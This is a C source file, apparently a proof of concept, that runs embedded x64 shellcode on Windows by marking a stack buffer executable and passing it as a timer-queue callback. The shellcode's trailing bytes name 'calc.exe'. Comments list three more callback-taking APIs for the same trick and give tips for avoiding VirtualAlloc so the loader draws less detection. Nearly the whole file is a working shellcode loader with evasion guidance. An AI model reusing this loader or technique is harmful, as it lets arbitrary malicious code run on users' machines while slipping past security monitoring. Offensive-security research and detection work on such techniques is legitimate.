#include <windows.h>
#include <threadpoollegacyapiset.h>


/*---Callback Execution Function Prototypes----

// 1. CreateTimerQueueTimer
// 3rd parameter = callback
BOOL CreateTimerQueueTimer(
	PHANDLE             phNewTimer,
	HANDLE              TimerQueue,
	WAITORTIMERCALLBACK Callback,      // <- payload here
	PVOID               Parameter,
	DWORD               DueTime,
	DWORD               Period,
	ULONG               Flags
);

// 2. EnumChildWindows
// 2nd parameter = callback
BOOL EnumChildWindows(
	HWND        hWndParent,
	WNDENUMPROC lpEnumFunc,            // <- payload here
	LPARAM      lParam
);

// 3. EnumUILanguagesW
// 1st parameter = callback
BOOL EnumUILanguagesW(
	UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,  // <- payload here
	DWORD                dwFlags,
	LONG_PTR             lParam
);

// 4. VerifierEnumerateResource (exported from verifier.dll)
// 4th parameter = callback; ResourceType must be AvrfResourceHeapAllocation
ULONG VerifierEnumerateResource(
	HANDLE                           Process,
	ULONG                            Flags,
	ULONG                            ResourceType,
	AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback,  // <- payload here
	PVOID                            EnumerationContext
);

// ---- Usage notes ----
// - Payload should be in RX memory (e.g., .text section) to avoid VirtualAlloc.
// - Local process only; not usable for remote injection.
// - Return values / correct params don't matter for execution.
// - Example casts:
//     (WAITORTIMERCALLBACK)Payload
//     (WNDENUMPROC)Payload
//     (UILANGUAGE_ENUMPROCW)Payload
//     (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload
// - VerifierEnumerateResource requires:
//     LoadLibraryA("verifier.dll");
//     GetProcAddress(hModule, "VerifierEnumerateResource");
//     ResourceType = AvrfResourceHeapAllocation (else payload won't run)
*/
int main() {
	char pay[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	SIZE_T s = sizeof(pay) - 1;
	
	DWORD oldProtect;
	//using only VirtualProtect
	VirtualProtect(pay, s, PAGE_EXECUTE_READWRITE, &oldProtect);
	LPVOID exec_mem = (LPVOID)pay;   // use the buffer's address directly
		// 1. Allocate executable memory
	//LPVOID exec_mem = VirtualAlloc(0, s, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// 2. Copy shellcode into executable memory
	//memcpy(exec_mem, pay, s);

	// 3. Create timer with executable memory address
	HANDLE hNewTimer = NULL;
	CreateTimerQueueTimer(&hNewTimer,
		NULL,	(WAITORTIMERCALLBACK)exec_mem,  // Cast the executable buffer
		NULL,	3000, 0,	WT_EXECUTEONLYONCE  // The missing 7th argument
);

	// Keep process alive so timer can fire
	Sleep(5000);
	return 0;

}